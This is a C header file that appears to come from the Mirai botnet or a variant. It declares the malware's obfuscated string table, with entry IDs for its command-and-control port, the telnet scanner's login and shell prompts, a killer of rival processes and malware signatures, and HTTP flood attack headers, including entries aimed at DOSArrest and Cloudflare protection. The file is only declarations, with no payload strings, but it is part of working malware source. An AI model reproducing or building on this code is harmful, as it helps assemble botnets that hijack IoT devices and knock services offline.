#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value
{
    char *val;
    uint16_t val_len;

    #ifdef DEBUG
        BOOL locked;
    #endif
};
#define TABLE_CNC_PORT 1
#define TABLE_SCAN_CB_PORT 2
#define TABLE_EXEC_SUCCESS 3
#define TABLE_SCAN_SHELL 4
#define TABLE_SCAN_ENABLE 5
#define TABLE_SCAN_SYSTEM 6
#define TABLE_SCAN_SH 7
#define TABLE_SCAN_QUERY 8
#define TABLE_SCAN_RESP 9
#define TABLE_SCAN_NCORRECT 10
#define TABLE_SCAN_PS 11
#define TABLE_SCAN_KILL_9 12
#define TABLE_KILLER_PROC 13
#define TABLE_KILLER_EXE 14
#define TABLE_KILLER_FD 15
#define TABLE_KILLER_MAPS 16
#define TABLE_KILLER_TCP 17
#define TABLE_KILLER_STATUS 18
#define TABLE_KILLER_ANIME 19
#define TABLE_MEM_ROUTE 20
#define TABLE_MEM_RC 21
#define TABLE_MEM_ASSWORD 22
#define TABLE_MEM_DVRHELP 23
#define TABLE_MEM_SHINTO3 24
#define TABLE_MEM_SHINTO5 25
#define TABLE_MEM_JOSHO1 26
#define TABLE_MEM_JOSHO2 27
#define TABLE_MEM_UPX 28
#define TABLE_ATK_VSE 29
#define TABLE_ATK_RESOLVER 30
#define TABLE_ATK_NSERV 31
#define TABLE_ATK_HTTP 32
#define TABLE_ATK_USRAGENT 33
#define TABLE_ATK_HOST 34
#define TABLE_ATK_GET 35
#define TABLE_ATK_POST 36
#define TABLE_ATK_KEEP_ALIVE 37
#define TABLE_ATK_ACCEPT 38
#define TABLE_ATK_ACCEPT_LNG 39
#define TABLE_ATK_CONTENT_TYPE 40
#define TABLE_ATK_SET_COOKIE 41
#define TABLE_ATK_REFRESH_HDR 42
#define TABLE_ATK_LOCATION_HDR 43
#define TABLE_ATK_SET_COOKIE_HDR 44
#define TABLE_ATK_CONTENT_LENGTH_HDR 45
#define TABLE_ATK_TRANSFER_ENCODING_HDR 46
#define TABLE_ATK_CHUNKED 47
#define TABLE_ATK_KEEP_ALIVE_HDR 48
#define TABLE_ATK_CONNECTION_HDR 49
#define TABLE_ATK_DOSARREST 50
#define TABLE_ATK_CLOUDFLARE_NGINX 51
#define TABLE_HTTP_ONE 52
#define TABLE_HTTP_TWO 53
#define TABLE_HTTP_THREE 54
#define TABLE_HTTP_FOUR 55
#define TABLE_HTTP_FIVE 56
#define TABLE_HTTP_SIX 57
#define TABLE_HTTP_SEVEN 58
#define TABLE_HTTP_EIGHT 59
#define TABLE_HTTP_NINE 60
#define TABLE_HTTP_TEN 61
#define TABLE_MISC_WATCHDOG 62
#define TABLE_MISC_WATCHDOG2 63
#define TABLE_SCAN_ASSWORD 64
#define TABLE_SCAN_OGIN 65
#define TABLE_SCAN_ENTER 66
#define TABLE_MISC_RAND 67

#define TABLE_MAX_KEYS 67

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
